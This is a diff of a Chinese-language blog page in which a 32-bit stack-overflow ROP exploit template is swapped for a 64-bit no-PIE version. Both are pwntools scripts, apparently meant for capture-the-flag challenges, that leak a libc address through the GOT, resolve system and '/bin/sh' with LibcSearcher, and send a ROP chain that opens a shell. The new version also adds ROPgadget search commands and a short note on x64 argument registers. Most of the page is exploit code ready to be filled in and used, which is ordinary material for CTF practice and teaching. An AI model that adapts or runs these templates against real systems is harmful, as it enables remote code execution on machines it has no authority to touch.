@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>32位栈溢出rop模板</title>
+    <title>64位栈溢出rop模板(无PIE)</title>
     <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -20,18 +20,18 @@
 
 
 
-<meta property="og:title" content="32位栈溢出rop模板" />
-<meta property="og:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc." />
+<meta property="og:title" content="64位栈溢出rop模板(无PIE)" />
+<meta property="og:description" content="64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() &#43; p64(pop_rdi) &#43; p64(read_got) payload&#43;= p64(puts_plt) &#43; p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset &#43; libc." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://hugo-toha.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-07-11T17:26:35+08:00" />
-<meta property="article:modified_time" content="2021-07-11T17:26:35+08:00" />
+<meta property="og:url" content="https://hugo-toha.github.io/zh-tw/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="zh-tw" />
+<meta property="article:published_time" content="2021-07-12T17:35:19+08:00" />
+<meta property="article:modified_time" content="2021-07-12T17:35:19+08:00" />
 
 
 
     
     
-<meta name="description" content="32位栈溢出rop模板" />
+<meta name="description" content="64位栈溢出rop模板(无PIE)" />
 <link
   rel="stylesheet"
   href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-dark.min.css"
@@ -124,71 +124,70 @@
         <div class="author-profile ml-auto align-self-lg-center">
           <img class="rounded-circle" src='/images/default-avatar_hud3032af26cae4ad3a900356053a829cd_96315_120x120_fit_box_2.png' alt="Author Image">
           <h5 class="author-name"></h5>
-          <p>July 11, 2021</p>
+          <p>July 12, 2021</p>
         </div>
 
         <div class="title">
-          <h1>32位栈溢出rop模板</h1>
+          <h1>64位栈溢出rop模板(无PIE)</h1>
         </div>
 
         <div class="post-content" id="post-content">
-          <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
+          <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
+<h2 id="exp模板">exp模板</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
 <span style="color:#75715e">#coding=utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
-process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./&#39;</span>
-<span style="color:#75715e">#p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;})</span>
-p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;&#39;</span>, )
-elf <span style="color:#f92672">=</span> ELF(process_name)
-<span style="color:#75715e">#**************泄露got并寻找libc</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(payload):
-	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(偏移) <span style="color:#f92672">+</span> payload
-	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&#39;</span>, payload)
- 
-main_addr <span style="color:#f92672">=</span> 
-write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>]
-write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;write&#34;</span>]
+<span style="color:#75715e">#p = process(&#34;./&#34;)</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>,)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./&#34;</span>)
 
-payload <span style="color:#f92672">=</span> p32(write_plt) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(write_got) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">4</span>)
-send_payload(payload)
-write_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>))
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;write_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, write_addr)
- 
-libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;write&#39;</span>, write_addr)
-libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;write&#39;</span>)
-system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
-binsh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, system_addr)
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;binsh_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, binsh_addr)
-<span style="color:#75715e">#*********************</span>
-<span style="color:#75715e">#*********************调用system（“/bin/sh”）</span>
-select <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-<span style="color:#66d9ef">if</span> select <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
-	<span style="color:#75715e">#方案1</span>
-	payload <span style="color:#f92672">=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr)
-<span style="color:#66d9ef">else</span>:
-	<span style="color:#75715e">#方案2</span>
-	read_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>]
-	pop3_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804856c</span>
-	bss_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>bss()
-	payload <span style="color:#f92672">=</span> p32(read_plt) <span style="color:#f92672">+</span> p32(pop3_ret) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(bss_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">8</span>)
-	payload <span style="color:#f92672">+=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(bss_addr)
-	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
- 
-send_payload(payload)
- 
-<span style="color:#75715e">#****************************</span>
+read_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>]
+puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+main_addr <span style="color:#f92672">=</span> 
+pop_rdi <span style="color:#f92672">=</span> 
+<span style="color:#75715e">#************泄露got*********</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>() <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(read_got)
+payload<span style="color:#f92672">+=</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(main_addr) 
+<span style="color:#75715e">#payload = payload.ljust(200,&#39;b&#39;)</span>
+p<span style="color:#f92672">.</span>sendline( payload)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&#39;</span>)
+read_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+print hex(read_addr)
+<span style="color:#75715e">#*****************************</span>
+<span style="color:#75715e">#***********搜索libc，寻址*******</span>
+libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#34;read&#34;</span>,read_addr)
+offset <span style="color:#f92672">=</span> read_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;read&#34;</span>)
+sys_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)
+bin_sh_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)
+<span style="color:#75715e">#***************************</span>
+<span style="color:#75715e">#************get shell************</span>
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(bin_sh_addr) 
+payload1<span style="color:#f92672">+=</span> p64(sys_addr) 
+payload1 <span style="color:#f92672">=</span> payload1<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">200</span>,<span style="color:#e6db74">&#39;b&#39;</span>)
+
+p<span style="color:#f92672">.</span>sendline(payload1)
+
 p<span style="color:#f92672">.</span>interactive()
-</code></pre></div>
+
+</code></pre></div><h2 id="ropgadget">ROPgadget</h2>
+<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;pop|ret&rsquo; | grep &lsquo;eax&rsquo;
+查找可存储寄存器的代码</p>
+<p>ROPgadget &ndash;binary rop &ndash;string &ldquo;/bin/sh&rdquo;
+查找字符串</p>
+<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;int&rsquo;
+查找有int 0x80的地址</p>
+<h2 id="64位传参">64位传参</h2>
+<p>对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。</p>
+
         </div>
 
         
         
           <div class="btn-improve-page">
-              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts%5c32%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
+              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/zh-tw%5cposts%5c64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
                 <i class="fas fa-code-branch"></i>
                 Improve this page
               </a>
@@ -235,7 +234,13 @@ p<span style="color:#f92672">.</span>interactive()
       <h5 class="text-center pl-3">Table of Contents</h5>
       <hr>
       <div class="toc">
-        <nav id="TableOfContents"></nav>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exp模板">exp模板</a></li>
+    <li><a href="#ropgadget">ROPgadget</a></li>
+    <li><a href="#64位传参">64位传参</a></li>
+  </ul>
+</nav>
       </div>
     </div>
     
